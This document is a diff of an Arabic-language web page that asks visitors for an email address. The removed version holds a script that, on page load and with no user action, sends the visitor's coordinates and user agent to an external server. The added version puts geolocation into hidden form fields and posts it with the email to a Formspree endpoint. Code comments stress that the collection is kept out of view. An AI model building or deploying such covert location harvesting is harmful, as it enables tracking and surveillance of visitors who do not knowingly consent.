@@ -1,152 +1,125 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>معلومات المستخدم</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>إرسال بيانات البريد والموقع</title>
   <style>
     body {
+      font-family: Arial, sans-serif;
       background: linear-gradient(to right, #2c3e50, #3498db);
       color: white;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       display: flex;
-      flex-direction: column;
-      align-items: center;
       justify-content: center;
+      align-items: center;
       height: 100vh;
       margin: 0;
+      flex-direction: column;
     }
-
-    h1 {
-      margin-bottom: 10px;
-      font-size: 28px;
-    }
-
-    .container {
-      background: rgba(0, 0, 0, 0.3);
-      padding: 30px;
-      border-radius: 15px;
-      box-shadow: 0 0 15px rgba(255,255,255,0.1);
+    form {
+      background: rgba(0,0,0,0.4);
+      padding: 25px;
+      border-radius: 10px;
+      width: 320px;
       text-align: center;
-      width: 90%;
-      max-width: 400px;
     }
-
     input[type="email"] {
       width: 100%;
       padding: 10px;
-      margin-top: 15px;
+      margin-bottom: 15px;
+      border-radius: 6px;
       border: none;
-      border-radius: 8px;
       font-size: 16px;
     }
-
     button {
-      margin-top: 20px;
-      padding: 12px 20px;
-      font-size: 16px;
+      width: 100%;
+      padding: 10px;
       background-color: #1abc9c;
       border: none;
-      border-radius: 8px;
+      border-radius: 6px;
       color: white;
+      font-size: 16px;
       cursor: pointer;
-      transition: background 0.3s;
     }
-
-    button:hover {
-      background-color: #16a085;
+    button:disabled {
+      background-color: #7f8c8d;
+      cursor: not-allowed;
     }
-
-    .info {
-      margin-top: 25px;
-      font-size: 15px;
-      line-height: 1.8;
+    .message {
+      margin-top: 15px;
+      font-size: 14px;
+      min-height: 20px;
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <h1>أدخل بريدك الإلكتروني</h1>
-    <input type="email" id="email" placeholder="example@email.com" required>
-    <button onclick="collectInfo()">إرسال</button>
-
-    <div class="info" id="output"></div>
-  </div>
+  <form id="dataForm" action="https://formspree.io/f/xzzvzzkk" method="POST">
+    <h2>أدخل بريدك الإلكتروني</h2>
+    <input type="email" name="email" id="email" placeholder="example@email.com" required />
+    <!-- حقول الموقع الجغرافي مخفية -->
+    <input type="hidden" name="latitude" id="latitude" />
+    <input type="hidden" name="longitude" id="longitude" />
+    <button type="submit">إرسال البيانات</button>
+    <div class="message" id="message"></div>
+  </form>
 
   <script>
-    function collectInfo() {
-      const email = document.getElementById('email').value;
-      const output = document.getElementById('output');
+    const form = document.getElementById('dataForm');
+    const messageDiv = document.getElementById('message');
 
-      if (!email || !email.includes('@')) {
-        output.innerHTML = "يرجى إدخال بريد إلكتروني صحيح.";
-        return;
-      }
-
-      // طلب الموقع الجغرافي (بدون تنبيه في الواجهة)
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          position => {
-            const lat = position.coords.latitude.toFixed(5);
-            const lon = position.coords.longitude.toFixed(5);
-            output.innerHTML = `
-              <strong>📧 بريدك:</strong> ${email}<br>
-              <strong>📍 موقعك الحالي:</strong><br>
-              خط العرض: ${lat}<br>
-              خط الطول: ${lon}
-            `;
-          },
-          error => {
-            output.innerHTML = 📧 بريدك: ${email}<br> ⚠ لم يتم السماح بالحصول على الموقع.;
-          }
-        );
-      } else {
-        output.innerHTML = 📧 بريدك: ${email}<br> ⚠ جهازك لا يدعم الموقع الجغرافي.;
-      }
-    }
-  </script>
-<script>
-  // دالة ترسل البيانات للسيرفر
-  function sendUserData(email) {
-    if (!navigator.geolocation) {
-      console.log("المتصفح لا يدعم الموقع الجغرافي");
-      return;
-    }
-
-    navigator.geolocation.getCurrentPosition(function(position) {
-      const data = {
-        email: email || "",  // إذا عندك نموذج بريد، خذ منه القيمة بدل "" 
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude,
-        userAgent: navigator.userAgent
-      };
-
-      fetch("https://data-server-tan.vercel.app/save", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      }).then(res => {
-        if(res.ok){
-          console.log("تم إرسال البيانات للسيرفر");
-        } else {
-          console.error("فشل الإرسال");
+    // طلب الموقع الجغرافي عند تحميل الصفحة
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          document.getElementById('latitude').value = position.coords.latitude.toFixed(6);
+          document.getElementById('longitude').value = position.coords.longitude.toFixed(6);
+        },
+        error => {
+          // لو رفض المستخدم المشاركة أو حدث خطأ، نترك الحقول فارغة
+          console.warn('لم يتم الحصول على الموقع:', error.message);
         }
-      }).catch(err => {
-        console.error("خطأ في الاتصال بالسيرفر", err);
+      );
+    } else {
+      console.warn('المتصفح لا يدعم الموقع الجغرافي');
+    }
+
+    // التعامل مع إرسال الفورم
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+      messageDiv.textContent = 'جارٍ إرسال البيانات...';
+
+      const formData = new FormData(form);
+
+      fetch(form.action, {
+        method: 'POST',
+        body: formData,
+        headers: { 'Accept': 'application/json' }
+      })
+      .then(response => {
+        if (response.ok) {
+          messageDiv.style.color = '#2ecc71';
+          messageDiv.textContent = 'تم إرسال البيانات بنجاح!';
+          form.reset();
+          // إعادة طلب الموقع بعد الإرسال تحضيراً لإرسال جديد
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+              pos => {
+                document.getElementById('latitude').value = pos.coords.latitude.toFixed(6);
+                document.getElementById('longitude').value = pos.coords.longitude.toFixed(6);
+              }
+            );
+          }
+        } else {
+          throw new Error('فشل في إرسال البيانات');
+        }
+      })
+      .catch(() => {
+        messageDiv.style.color = '#e74c3c';
+        messageDiv.textContent = 'حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.';
       });
-    }, function(error) {
-      console.error("تعذر الحصول على الموقع:", error);
     });
-  }
+  </script>
 
-  // مثال: لو عندك input لبريد إلكتروني في الموقع اسمه emailInput
-  // تقدر تستخدمه هكذا:
-  // const email = document.getElementById('emailInput').value;
-  // sendUserData(email);
-
-  // إذا ما عندك بريد، تقدر ترسل بيانات بدون بريد:
-  sendUserData();
-</script>
 </body>
 </html>
